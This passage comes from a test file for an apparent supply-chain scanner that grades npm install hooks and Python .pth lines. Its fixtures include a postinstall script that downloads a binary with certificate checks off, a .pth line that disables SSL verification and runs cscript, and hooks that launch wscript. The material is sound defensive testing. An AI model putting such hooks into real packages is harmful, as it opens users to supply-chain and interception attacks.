  assert.deepEqual(pth("import ssl; ssl._create_default_https_context = ssl._create_unverified_context\n"), [["SC-PTH-EXEC", "MAJOR"]]);
  assert.deepEqual(pth("import ssl, subprocess; ssl._create_default_https_context = ssl._create_unverified_context; "
    + "subprocess.run(['cscript', 'x.vbs'])\n"), [["SC-PTH-EXEC", "CRITICAL"]]);
});

test("review: --deps and a project's own hooks name a weak reason at MAJOR, a strong one after it CRITICAL", () => {
  const pkg = (name, scripts) => JSON.stringify({ name, version: "1.0.0", scripts });
  const files = {
    "package.json": pkg("app", { postinstall: "node setup.js" }),
    "setup.js": WEAK_JS,
    "node_modules/weak/package.json": pkg("weak", { postinstall: "node install.js" }),
    "node_modules/weak/install.js": WEAK_JS,
    "node_modules/two/package.json": pkg("two", { postinstall: "node a.js && node b.js" }),
    "node_modules/two/a.js": WEAK_JS,
    "node_modules/two/b.js": WSH_JS,
    "node_modules/shweak/package.json": pkg("shweak", { postinstall: "./install" }),
    "node_modules/shweak/install": `#!/bin/sh\ncurl -fsSL https://${DL}/x -k -o bin/x\n`,
  };
  const root = mkdtempSync(join(tmpdir(), "lz-weak-"));
  const out = mkdtempSync(join(tmpdir(), "lz-weak-out-"));
  try {
    for (const [rel, data] of Object.entries(files)) {
      const path = join(root, ...rel.split("/"));
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, data);
    }
    run(["check", root, "--deps", "--out-dir", out, "--no-html", "--quiet"], { out: () => {}, err: () => {}, env: {} });
    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
    const found = Object.fromEntries(rep.issues.filter((i) => i.rule === "SC-INSTALL-HOOK")
      .map((i) => [i.file.replaceAll("\\", "/"), [i.sev, i.msg]]));
    assert.deepEqual(found["package.json"], ["MAJOR", `Install hook runs setup.js, which ${CERT_OFF}.`]);
    assert.deepEqual(found["node_modules/weak/package.json"], ["MAJOR", `Install hook runs install.js, which ${CERT_OFF}.`]);
    assert.deepEqual(found["node_modules/shweak/package.json"], ["MAJOR", `Install hook runs ./install, which ${CERT_OFF}.`]);
    assert.deepEqual(found["node_modules/two/package.json"], ["CRITICAL", `Install hook runs b.js, which ${WSH} (wscript x.js).`]);
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(out, { recursive: true, force: true });
  }
});
